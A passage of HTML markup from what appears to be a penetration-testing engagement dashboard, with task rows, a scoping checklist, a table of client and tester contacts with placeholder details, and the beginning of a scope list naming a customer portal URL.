                                        <td><span class="status pending">Pending</span></td>
                                        <td><span class="criticality medium">Medium</span></td>
                                        <td>Admin Team</td>
                                        <td>25/11/2024</td>
                                        <td>Not Started</td>
                                        <td>
                                            <button class="table-btn" onclick="markTaskComplete(this)" title="Complete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="admin" data-status="pending" data-priority="low">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Submit Insurance Certificate</strong></td>
                                        <td><span class="asset-type network"> Admin</span></td>
                                        <td><span class="status pending">Pending</span></td>
                                        <td><span class="criticality low">Low</span></td>
                                        <td>Admin Team</td>
                                        <td>29/11/2024</td>
                                        <td>Not Started</td>
                                        <td>
                                            <button class="table-btn" onclick="markTaskComplete(this)" title="Complete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="admin" data-status="pending" data-priority="high">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Invoice for Initial Payment</strong></td>
                                        <td><span class="asset-type network"> Admin</span></td>
                                        <td><span class="status pending">Pending</span></td>
                                        <td><span class="criticality high">High</span></td>
                                        <td>Finance Team</td>
                                        <td>02/12/2024</td>
                                        <td>Not Started</td>
                                        <td>
                                            <button class="table-btn" onclick="markTaskComplete(this)" title="Complete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="legal" data-status="completed" data-priority="high" style="opacity: 0.6;">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Contract Execution</strong></td>
                                        <td><span class="asset-type network"> Legal</span></td>
                                        <td><span class="status completed">Completed</span></td>
                                        <td><span class="criticality high">High</span></td>
                                        <td>Legal Team</td>
                                        <td>10/11/2024</td>
                                        <td><span style="color: var(--success);"> Done</span></td>
                                        <td>
                                            <button class="table-btn disabled" disabled title="Completed"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-category="admin" data-status="completed" data-priority="medium" style="opacity: 0.6;">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Background Checks</strong></td>
                                        <td><span class="asset-type network"> Admin</span></td>
                                        <td><span class="status completed">Completed</span></td>
                                        <td><span class="criticality medium">Medium</span></td>
                                        <td>HR Team</td>
                                        <td>08/11/2024</td>
                                        <td><span style="color: var(--success);"> Done</span></td>
                                        <td>
                                            <button class="table-btn disabled" disabled title="Completed"></button>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        
                        <!-- Mobile Card View -->
                        <div class="assets-mobile-view">
                            <div class="asset-card">
                                <div class="asset-card-header">
                                    <div>
                                        <div class="asset-card-title">Chase Authorization Form</div>
                                        <div class="asset-card-subtitle">Legal - Due Today</div>
                                    </div>
                                    <div class="asset-card-badges">
                                        <span class="criticality critical">High</span>
                                        <span class="status not-started">Urgent</span>
                                    </div>
                                </div>
                                <div class="asset-card-actions">
                                    <button class="table-btn"> Complete</button>
                                </div>
                            </div>
                            <div class="asset-card">
                                <div class="asset-card-header">
                                    <div>
                                        <div class="asset-card-title">VPN Access Setup</div>
                                        <div class="asset-card-subtitle">Setup - In Progress</div>
                                    </div>
                                    <div class="asset-card-badges">
                                        <span class="criticality high">High</span>
                                        <span class="status testing">In Progress</span>
                                    </div>
                                </div>
                                <div class="asset-card-actions">
                                    <button class="table-btn"> Complete</button>
                                </div>
                            </div>
                            <div class="asset-card">
                                <div class="asset-card-header">
                                    <div>
                                        <div class="asset-card-title">Send Address Information</div>
                                        <div class="asset-card-subtitle">Communication - Urgent</div>
                                    </div>
                                    <div class="asset-card-badges">
                                        <span class="criticality high">High</span>
                                        <span class="status urgent">Urgent</span>
                                    </div>
                                </div>
                                <div class="asset-card-actions">
                                    <button class="table-btn"> Complete</button>
                                </div>
                            </div>
                        </div>
                        
                        
                        <!-- Bulk Actions -->
                        <div class="bulk-actions" id="tasksBulkActions" style="display: none;">
                            <div class="bulk-info">
                                <span id="tasksSelectedCount">0</span> tasks selected
                            </div>
                            <div class="bulk-buttons">
                                <button class="bulk-btn" onclick="bulkMarkComplete()">Mark Complete</button>
                                <button class="bulk-btn danger" onclick="bulkDeleteTasks()">Delete Selected</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="screen-content" id="comms">
                    <div class="placeholder-content">
                        <div class="placeholder-icon"></div>
                        <h3 class="placeholder-title">Communications</h3>
                        <p class="placeholder-text">Client messages and updates.</p>
                    </div>
                </div>
                
                <div class="screen-content" id="checklist">
                    <div class="assets-container">
                        <!-- Checklist Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number" id="totalQuestions">24</div>
                                    <div class="summary-label">Total Questions</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);" id="completedQuestions">8</div>
                                    <div class="summary-label">Completed</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--warning);" id="inProgressQuestions">6</div>
                                    <div class="summary-label">In Progress</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--danger);" id="blockerQuestions">2</div>
                                    <div class="summary-label">Blockers</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportChecklist()"> Export</button>
                                <button class="action-btn secondary" onclick="importChecklist()"> Import</button>
                                <button class="action-btn primary" onclick="scheduleKickoffCall()"> Schedule KO Call</button>
                            </div>
                        </div>
                        
                        <!-- Checklist Filters -->
                        <div class="assets-filters">
                            <div class="filter-section">
                                <label>Category:</label>
                                <div class="filter-group">
                                    <button class="filter-btn active" onclick="filterChecklist('all')">All</button>
                                    <button class="filter-btn" onclick="filterChecklist('timing')"> Timing</button>
                                    <button class="filter-btn" onclick="filterChecklist('contacts')"> Contacts</button>
                                    <button class="filter-btn" onclick="filterChecklist('scope')"> Scope</button>
                                    <button class="filter-btn" onclick="filterChecklist('technical')"> Technical</button>
                                    <button class="filter-btn" onclick="filterChecklist('logistics')"> Logistics</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Status:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterChecklist('completed')"> Completed</button>
                                    <button class="filter-btn" onclick="filterChecklist('in-progress')"> In Progress</button>
                                    <button class="filter-btn" onclick="filterChecklist('pending')"> Pending</button>
                                    <button class="filter-btn" onclick="filterChecklist('blocker')"> Blockers</button>
                                </div>
                            </div>
                            
                            <div class="search-section">
                                <input type="text" class="search-input" id="checklistSearch" placeholder="Search checklist items..." onkeyup="searchChecklist()">
                                <button class="search-btn"></button>
                            </div>
                        </div>
                        
                        <!-- Checklist Items -->
                        <div class="checklist-container">
                            
                            <!-- Timing Section -->
                            <div class="checklist-section" data-category="timing">
                                <div class="checklist-section-header">
                                    <h3> Testing Timeline & Scheduling</h3>
                                    <div class="section-progress">
                                        <span class="progress-text">3/5 Complete</span>
                                        <div class="progress-bar">
                                            <div class="progress-fill" style="width: 60%"></div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="checklist-item" data-type="date" data-status="completed">
                                    <div class="checklist-question">
                                        <div class="question-header">
                                            <span class="status-indicator completed"></span>
                                            <label class="question-text">Can you confirm the dates of the test?</label>
                                            <button class="notes-toggle" onclick="toggleNotes(this)" title="Add Notes"></button>
                                        </div>
                                        <div class="question-input">
                                            <div class="date-range-input">
                                                <label>Start Date:</label>
                                                <input type="date" value="2024-11-18" onchange="updateChecklistStatus(this)" />
                                                <label>End Date:</label>
                                                <input type="date" value="2024-11-22" onchange="updateChecklistStatus(this)" />
                                            </div>
                                        </div>
                                        <div class="question-notes" style="display: none;">
                                            <textarea placeholder="Add notes about testing dates..." rows="2">Client confirmed 18-22 Nov works well. Avoiding Friday afternoon for final reporting.</textarea>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="checklist-item" data-type="date" data-status="in-progress">
                                    <div class="checklist-question">
                                        <div class="question-header">
                                            <span class="status-indicator in-progress"></span>
                                            <label class="question-text">When would be good to test access credentials?</label>
                                            <button class="notes-toggle" onclick="toggleNotes(this)" title="Add Notes"></button>
                                        </div>
                                        <div class="question-input">
                                            <div class="date-time-input">
                                                <label>Preferred Date:</label>
                                                <input type="date" value="2024-11-15" onchange="updateChecklistStatus(this)" />
                                                <label>Time Window:</label>
                                                <select onchange="updateChecklistStatus(this)">
                                                    <option value="">Select time...</option>
                                                    <option value="morning" selected>Morning (9AM-12PM)</option>
                                                    <option value="afternoon">Afternoon (1PM-5PM)</option>
                                                    <option value="evening">Evening (6PM-9PM)</option>
                                                    <option value="flexible">Flexible</option>
                                                </select>
                                            </div>
                                        </div>
                                        <div class="question-notes" style="display: none;">
                                            <textarea placeholder="Add notes about access testing..." rows="2">Waiting for client to confirm VPN access details.</textarea>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="checklist-item" data-type="multiple" data-status="completed">
                                    <div class="checklist-question">
                                        <div class="question-header">
                                            <span class="status-indicator completed"></span>
                                            <label class="question-text">What are the preferred communication windows?</label>
                                            <button class="notes-toggle" onclick="toggleNotes(this)" title="Add Notes"></button>
                                        </div>
                                        <div class="question-input">
                                            <div class="checkbox-group">
                                                <label><input type="checkbox" checked onchange="updateChecklistStatus(this)" /> Business Hours (9AM-5PM)</label>
                                                <label><input type="checkbox" checked onchange="updateChecklistStatus(this)" /> Emergency Contact (24/7)</label>
                                                <label><input type="checkbox" onchange="updateChecklistStatus(this)" /> Weekend Testing Allowed</label>
                                                <label><input type="checkbox" onchange="updateChecklistStatus(this)" /> Out of Hours Notifications OK</label>
                                            </div>
                                        </div>
                                        <div class="question-notes" style="display: none;">
                                            <textarea placeholder="Add notes about communication..." rows="2"></textarea>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Contacts Section -->
                            <div class="checklist-section" data-category="contacts">
                                <div class="checklist-section-header">
                                    <h3> Key Contacts & Stakeholders</h3>
                                    <div class="section-progress">
                                        <span class="progress-text">2/4 Complete</span>
                                        <div class="progress-bar">
                                            <div class="progress-fill" style="width: 50%"></div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="checklist-item" data-type="contact" data-status="completed">
                                    <div class="checklist-question">
                                        <div class="question-header">
                                            <span class="status-indicator completed"></span>
                                            <label class="question-text">Who is the primary contact?</label>
                                            <button class="notes-toggle" onclick="toggleNotes(this)" title="Add Notes"></button>
                                        </div>
                                        <div class="question-input">
                                            <div class="contact-input">
                                                <div class="contact-picker">
                                                    <select class="contact-select" onchange="selectContact(this)" data-contact-role="primary">
                                                        <option value="">Select existing contact...</option>
                                                        <option value="sarah-johnson" selected>Sarah Johnson - CISO</option>
                                                        <option value="david-chen">David Chen - Security Operations Manager</option>
                                                        <option value="michael-brown">Michael Brown - IT Director</option>
                                                        <option value="emma-davis">Emma Davis - Compliance Manager</option>
                                                        <option value="james-wilson">James Wilson - Network Administrator</option>
                                                    </select>
                                                    <button class="add-contact-btn" onclick="showAddContactModal('primary')" title="Add New Contact">
                                                        <span></span> Add New
                                                    </button>
                                                    <button class="contact-link-btn" onclick="jumpToContacts()" title="View All Contacts">
                                                        <span></span> View All
                                                    </button>
                                                </div>
                                                <div class="selected-contact-display show" id="contact-display-primary">
                                                    <div class="contact-details">
                                                        <div class="contact-detail">
                                                            <span class="contact-detail-label">Name</span>
                                                            <span class="contact-detail-value">Sarah Johnson</span>
                                                        </div>
                                                        <div class="contact-detail">
                                                            <span class="contact-detail-label">Role</span>
                                                            <span class="contact-detail-value">CISO</span>
                                                        </div>
                                                        <div class="contact-detail">
                                                            <span class="contact-detail-label">Email</span>
                                                            <span class="contact-detail-value">sarah.johnson@acmecorp.com</span>
                                                        </div>
                                                        <div class="contact-detail">
                                                            <span class="contact-detail-label">Phone</span>
                                                            <span class="contact-detail-value">+44 7700 900123</span>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="question-notes" style="display: none;">
                                            <textarea placeholder="Add notes about primary contact..." rows="2">Main decision maker and project sponsor. Prefers email communication.</textarea>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="checklist-item" data-type="contact" data-status="completed">
                                    <div class="checklist-question">
                                        <div class="question-header">
                                            <span class="status-indicator completed"></span>
                                            <label class="question-text">Who is the technical contact?</label>
                                            <button class="notes-toggle" onclick="toggleNotes(this)" title="Add Notes"></button>
                                        </div>
                                        <div class="question-input">
                                            <div class="contact-input">
                                                <div class="contact-picker">
                                                    <select class="contact-select" onchange="selectContact(this)" data-contact-role="technical">
                                                        <option value="">Select existing contact...</option>
                                                        <option value="sarah-johnson">Sarah Johnson - CISO</option>
                                                        <option value="david-chen" selected>David Chen - Security Operations Manager</option>
                                                        <option value="michael-brown">Michael Brown - IT Director</option>
                                                        <option value="emma-davis">Emma Davis - Compliance Manager</option>
                                                        <option value="james-wilson">James Wilson - Network Administrator</option>
                                                    </select>
                                                    <button class="add-contact-btn" onclick="showAddContactModal('technical')" title="Add New Contact">
                                                        <span></span> Add New
                                                    </button>
                                                    <button class="contact-link-btn" onclick="jumpToContacts()" title="View All Contacts">
                                                        <span></span> View All
                                                    </button>
                                                </div>
                                                <div class="selected-contact-display show" id="contact-display-technical">
                                                    <div class="contact-details">
                                                        <div class="contact-detail">
                                                            <span class="contact-detail-label">Name</span>
                                                            <span class="contact-detail-value">David Chen</span>
                                                        </div>
                                                        <div class="contact-detail">
                                                            <span class="contact-detail-label">Role</span>
                                                            <span class="contact-detail-value">Security Operations Manager</span>
                                                        </div>
                                                        <div class="contact-detail">
                                                            <span class="contact-detail-label">Email</span>
                                                            <span class="contact-detail-value">david.chen@acmecorp.com</span>
                                                        </div>
                                                        <div class="contact-detail">
                                                            <span class="contact-detail-label">Phone</span>
                                                            <span class="contact-detail-value">+44 7700 900456</span>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="question-notes" style="display: none;">
                                            <textarea placeholder="Add notes about technical contact..." rows="2">24/7 emergency contact. Can provide technical access and resolve issues.</textarea>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="checklist-item" data-type="multiple-contact" data-status="in-progress">
                                    <div class="checklist-question">
                                        <div class="question-header">
                                            <span class="status-indicator in-progress"></span>
                                            <label class="question-text">Who needs access to the final reports?</label>
                                            <button class="notes-toggle" onclick="toggleNotes(this)" title="Add Notes"></button>
                                        </div>
                                        <div class="question-input">
                                            <div class="multiple-contacts">
                                                <div class="contact-entry">
                                                    <select class="contact-select" onchange="selectContactForReports(this)">
                                                        <option value="">Select contact...</option>
                                                        <option value="sarah-johnson" selected>Sarah Johnson - CISO</option>
                                                        <option value="david-chen">David Chen - Security Operations Manager</option>
                                                        <option value="michael-brown">Michael Brown - IT Director</option>
                                                        <option value="emma-davis">Emma Davis - Compliance Manager</option>
                                                        <option value="james-wilson">James Wilson - Network Administrator</option>
                                                    </select>
                                                    <select onchange="updateChecklistStatus(this)">
                                                        <option value="executive" selected>Executive Summary</option>
                                                        <option value="technical">Technical Report</option>
                                                        <option value="both">Both Reports</option>
                                                    </select>
                                                    <button class="remove-contact" onclick="removeContact(this)" title="Remove"></button>
                                                </div>
                                                <div class="contact-entry">
                                                    <select class="contact-select" onchange="selectContactForReports(this)">
                                                        <option value="">Select contact...</option>
                                                        <option value="sarah-johnson">Sarah Johnson - CISO</option>
                                                        <option value="david-chen">David Chen - Security Operations Manager</option>
                                                        <option value="michael-brown" selected>Michael Brown - IT Director</option>
                                                        <option value="emma-davis">Emma Davis - Compliance Manager</option>
                                                        <option value="james-wilson">James Wilson - Network Administrator</option>
                                                    </select>
                                                    <select onchange="updateChecklistStatus(this)">
                                                        <option value="executive" selected>Executive Summary</option>
                                                        <option value="technical">Technical Report</option>
                                                        <option value="both">Both Reports</option>
                                                    </select>
                                                    <button class="remove-contact" onclick="removeContact(this)" title="Remove"></button>
                                                </div>
                                                <button class="add-another-contact" onclick="addContactToReports(this)">
                                                    <span></span> Add Another Contact
                                                </button>
                                            </div>
                                        </div>
                                        <div class="question-notes" style="display: none;">
                                            <textarea placeholder="Add notes about report distribution..." rows="2">Waiting for confirmation on whether legal team needs copies.</textarea>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Scope Section -->
                            <div class="checklist-section" data-category="scope">
                                <div class="checklist-section-header">
                                    <h3> Scope & Requirements</h3>
                                    <div class="section-progress">
                                        <span class="progress-text">1/3 Complete</span>
                                        <div class="progress-bar">
                                            <div class="progress-fill" style="width: 33%"></div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="checklist-item" data-type="scope-link" data-status="completed">
                                    <div class="checklist-question">
                                        <div class="question-header">
                                            <span class="status-indicator completed"></span>
                                            <label class="question-text">Can I confirm the following scope?</label>
                                            <button class="notes-toggle" onclick="toggleNotes(this)" title="Add Notes"></button>
                                        </div>
                                        <div class="question-input">
                                            <div class="scope-review">
                                                <div class="scope-summary">
                                                    <div class="scope-item">
                                                        <span class="scope-type"> External</span>
                                                        <span class="scope-count">3 items</span>
                                                        <button class="review-scope" onclick="reviewScope('external')">Review</button>
                                                    </div>
                                                    <div class="scope-item">
                                                        <span class="scope-type"> Internal</span>
                                                        <span class="scope-count">2 items</span>
                                                        <button class="review-scope" onclick="reviewScope('internal')">Review</button>
                                                    </div>
                                                    <div class="scope-item">
                                                        <span class="scope-type"> Web App</span>
                                                        <span class="scope-count">1 item</span>
                                                        <button class="review-scope" onclick="reviewScope('webapp')">Review</button>
                                                    </div>
                                                </div>
                                                <div class="scope-actions">
                                                    <button class="scope-btn" onclick="openScopeManager()"> Manage Scope</button>
                                                    <label class="approval-checkbox">
                                                        <input type="checkbox" checked onchange="updateChecklistStatus(this)" />
                                                        <span>Scope Approved</span>
                                                    </label>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="question-notes" style="display: none;">
                                            <textarea placeholder="Add notes about scope..." rows="2">Client confirmed all items. Added note about avoiding production database server.</textarea>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="checklist-item" data-type="number" data-status="in-progress">
                                    <div class="checklist-question">
                                        <div class="question-header">
                                            <span class="status-indicator in-progress"></span>
                                            <label class="question-text">How many user roles will there be?</label>
                                            <button class="notes-toggle" onclick="toggleNotes(this)" title="Add Notes"></button>
                                        </div>
                                        <div class="question-input">
                                            <div class="number-input">
                                                <div class="number-control">
                                                    <input type="number" min="1" max="20" value="4" onchange="updateChecklistStatus(this)" />
                                                    <span class="input-label">roles</span>
                                                </div>
                                                <div class="role-details">
                                                    <input type="text" placeholder="Role 1 name..." value="Admin" />
                                                    <input type="text" placeholder="Role 2 name..." value="User" />
                                                    <input type="text" placeholder="Role 3 name..." value="Manager" />
                                                    <input type="text" placeholder="Role 4 name..." value="" />
                                                </div>
                                            </div>
                                        </div>
                                        <div class="question-notes" style="display: none;">
                                            <textarea placeholder="Add notes about user roles..." rows="2">Still waiting on details for Role 4 - may be supervisor level.</textarea>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="checklist-item" data-type="text" data-status="pending">
                                    <div class="checklist-question">
                                        <div class="question-header">
                                            <span class="status-indicator pending"></span>
                                            <label class="question-text">Can you explain the purpose of the web application?</label>
                                            <button class="notes-toggle" onclick="toggleNotes(this)" title="Add Notes"></button>
                                        </div>
                                        <div class="question-input">
                                            <div class="free-text-container">
                                                <textarea placeholder="Please describe the web application's purpose, main features, and business use..." rows="4" onchange="updateChecklistStatus(this)"></textarea>
                                            </div>
                                        </div>
                                        <div class="question-notes" style="display: none;">
                                            <textarea placeholder="Add notes about application purpose..." rows="2">Need to schedule follow-up call to discuss application architecture.</textarea>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="screen-content" id="contacts">
                    <div class="assets-container">
                        <!-- Contacts Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">5</div>
                                    <div class="summary-label">Total Contacts</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--danger);">2</div>
                                    <div class="summary-label">Emergency</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--text-accent);">3</div>
                                    <div class="summary-label">Technical</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">3</div>
                                    <div class="summary-label">Report Recipients</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportContacts()"> Export</button>
                                <button class="action-btn primary" onclick="openModal('addContactModal')">+ Add Contact</button>
                            </div>
                        </div>
                        
                        <!-- Contacts Filters -->
                        <div class="assets-filters">
                            <div class="filter-section">
                                <label>Type:</label>
                                <div class="filter-group">
                                    <button class="filter-btn active" onclick="filterContacts('all')">All</button>
                                    <button class="filter-btn" onclick="filterContacts('primary')">Primary</button>
                                    <button class="filter-btn" onclick="filterContacts('technical')">Technical</button>
                                    <button class="filter-btn" onclick="filterContacts('emergency')">Emergency</button>
                                    <button class="filter-btn" onclick="filterContacts('escalation')">Escalation</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Reports:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterContacts('receive-report')">Report Recipients</button>
                                </div>
                            </div>
                            
                            <div class="search-section">
                                <input type="text" class="search-input" id="contactSearch" placeholder="Search contacts, roles, emails..." onkeyup="searchContacts()">
                                <button class="search-btn"></button>
                            </div>
                        </div>
                        
                        <!-- Contacts Table -->
                        <div class="assets-table-container">
                            <table class="assets-table" id="contactsTable">
                                <thead>
                                    <tr>
                                        <th><input type="checkbox" onchange="toggleSelectAll(this)"></th>
                                        <th onclick="sortContacts('name')">Name <span class="sort-arrow"></span></th>
                                        <th onclick="sortContacts('role')">Role <span class="sort-arrow"></span></th>
                                        <th onclick="sortContacts('email')">Email <span class="sort-arrow"></span></th>
                                        <th onclick="sortContacts('phone')">Phone <span class="sort-arrow"></span></th>
                                        <th>Tags</th>
                                        <th>Notes</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="asset-row" data-tags="primary,receive-report" data-type="primary">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Sarah Johnson</strong></td>
                                        <td>Chief Information Security Officer</td>
                                        <td><a href="mailto:sarah.johnson@acmecorp.com">sarah.johnson@acmecorp.com</a></td>
                                        <td>+44 7700 900123</td>
                                        <td>
                                            <span class="tag primary">Primary</span>
                                            <span class="tag report">Report Recipient</span>
                                        </td>
                                        <td>Main point of contact for project approval and final report delivery</td>
                                        <td>
                                            <button class="table-btn" onclick="editContact(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteContact(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-tags="technical,emergency" data-type="technical">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>David Chen</strong></td>
                                        <td>Security Operations Manager</td>
                                        <td><a href="mailto:david.chen@acmecorp.com">david.chen@acmecorp.com</a></td>
                                        <td>+44 7700 900456</td>
                                        <td>
                                            <span class="tag emergency">Emergency</span>
                                            <span class="tag technical">Technical</span>
                                        </td>
                                        <td>24/7 emergency contact, technical point for vulnerability discussions</td>
                                        <td>
                                            <button class="table-btn" onclick="editContact(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteContact(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-tags="account-manager" data-type="business">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Rebecca Mills</strong></td>
                                        <td>Client Relationship Manager</td>
                                        <td><a href="mailto:rebecca.mills@acmecorp.com">rebecca.mills@acmecorp.com</a></td>
                                        <td>+44 7700 900789</td>
                                        <td>
                                            <span class="tag business">Account Manager</span>
                                        </td>
                                        <td>Commercial discussions and contract management</td>
                                        <td>
                                            <button class="table-btn" onclick="editContact(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteContact(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-tags="security-consultant,technical" data-type="internal">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>James Wilson</strong></td>
                                        <td>Lead Penetration Tester</td>
                                        <td><a href="mailto:james.wilson@pentestco.com">james.wilson@pentestco.com</a></td>
                                        <td>+44 7700 900321</td>
                                        <td>
                                            <span class="tag internal">Internal</span>
                                            <span class="tag technical">Technical</span>
                                        </td>
                                        <td>Lead tester on this engagement</td>
                                        <td>
                                            <button class="table-btn" onclick="editContact(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteContact(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-tags="escalation,receive-report" data-type="escalation">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Michael Thompson</strong></td>
                                        <td>Chief Technology Officer</td>
                                        <td><a href="mailto:michael.thompson@acmecorp.com">michael.thompson@acmecorp.com</a></td>
                                        <td>+44 7700 900654</td>
                                        <td>
                                            <span class="tag escalation">Escalation</span>
                                            <span class="tag report">Report Recipient</span>
                                        </td>
                                        <td>Escalation for critical findings, receives executive summary</td>
                                        <td>
                                            <button class="table-btn" onclick="editContact(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteContact(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        
                        <!-- Mobile Card View -->
                        <div class="assets-mobile-view">
                            <div class="asset-card">
                                <div class="asset-card-header">
                                    <div>
                                        <div class="asset-card-title">Sarah Johnson</div>
                                        <div class="asset-card-subtitle">Chief Information Security Officer</div>
                                    </div>
                                    <div class="asset-card-badges">
                                        <span class="tag primary">Primary</span>
                                        <span class="tag report">Report Recipient</span>
                                    </div>
                                </div>
                                <div class="asset-card-details">
                                    <div> sarah.johnson@acmecorp.com</div>
                                    <div> +44 7700 900123</div>
                                </div>
                                <div class="asset-card-actions">
                                    <button class="table-btn"> Edit</button>
                                </div>
                            </div>
                            <div class="asset-card">
                                <div class="asset-card-header">
                                    <div>
                                        <div class="asset-card-title">David Chen</div>
                                        <div class="asset-card-subtitle">Security Operations Manager</div>
                                    </div>
                                    <div class="asset-card-badges">
                                        <span class="tag emergency">Emergency</span>
                                        <span class="tag technical">Technical</span>
                                    </div>
                                </div>
                                <div class="asset-card-details">
                                    <div> david.chen@acmecorp.com</div>
                                    <div> +44 7700 900456</div>
                                </div>
                                <div class="asset-card-actions">
                                    <button class="table-btn"> Edit</button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Bulk Actions -->
                        <div class="bulk-actions" id="contactsBulkActions" style="display: none;">
                            <div class="bulk-info">
                                <span id="contactsSelectedCount">0</span> contacts selected
                            </div>
                            <div class="bulk-buttons">
                                <button class="bulk-btn" onclick="bulkEditContacts()">Edit Selected</button>
                                <button class="bulk-btn" onclick="bulkExportContacts()">Export Selected</button>
                                <button class="bulk-btn danger" onclick="bulkDeleteContacts()">Delete Selected</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="screen-content" id="scope">
                    <div class="assets-container">
                        <!-- Scope Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">8</div>
                                    <div class="summary-label">Testing Segments</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">6</div>
                                    <div class="summary-label">Active</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--warning);">2</div>
                                    <div class="summary-label">Planned</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--text-accent);">24</div>
                                    <div class="summary-label">Total Items</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportScope()"> Export</button>
                                <button class="action-btn primary" onclick="openModal('addSegmentModal')">+ Add Segment</button>
                            </div>
                        </div>
                        
                        <!-- Scope Filters -->
                        <div class="assets-filters">
                            <div class="filter-section">
                                <label>Segments:</label>
                                <div class="filter-group">
                                    <button class="filter-btn active" onclick="filterScopeSegments('all')">All Segments</button>
                                    <button class="filter-btn" onclick="filterScopeSegments('active')">Active Only</button>
                                    <button class="filter-btn" onclick="filterScopeSegments('planned')">Planned Only</button>
                                    <button class="filter-btn" onclick="filterScopeSegments('external')">External</button>
                                    <button class="filter-btn" onclick="filterScopeSegments('internal')">Internal</button>
                                </div>
                            </div>
                            
                            <div class="search-section">
                                <input type="text" class="search-input" id="scopeSearch" placeholder="Search segments, items, URLs..." onkeyup="searchScope()">
                                <button class="search-btn"></button>
                            </div>
                        </div>
                        
                        <!-- Testing Segments Cards -->
                        <div class="testing-segments-container">
                            
                            <!-- External Segment Card -->
                            <div class="segment-card" data-segment="external" data-status="active">
                                <div class="segment-card-header">
                                    <div class="segment-info">
                                        <span class="segment-icon"></span>
                                        <div>
                                            <h3 class="segment-title">External Perimeter</h3>
                                            <div class="segment-meta">
                                                <span class="status completed">Active</span>
                                                <span class="segment-date">Started: 14/11/2024</span>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="segment-actions">
                                        <button class="action-btn secondary" onclick="addScopeItemToSegment('external')">+ Add Item</button>
                                        <button class="table-btn" onclick="editSegment(this)" title="Edit"></button>
                                        <button class="table-btn danger" onclick="deleteSegment(this)" title="Delete"></button>
                                    </div>
                                </div>
                                
                                <div class="segment-items-table">
                                    <table class="scope-table">
                                        <thead>
                                            <tr>
                                                <th>Type</th>
                                                <th>Target</th>
                                                <th>Description</th>
                                                <th>Added</th>
                                                <th>Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <tr>
                                                <td><span class="asset-type network"> URL</span></td>
                                                <td><strong>https://portal.acmecorp.com</strong></td>
                                                <td>Main customer portal and web application - primary target for external testing</td>
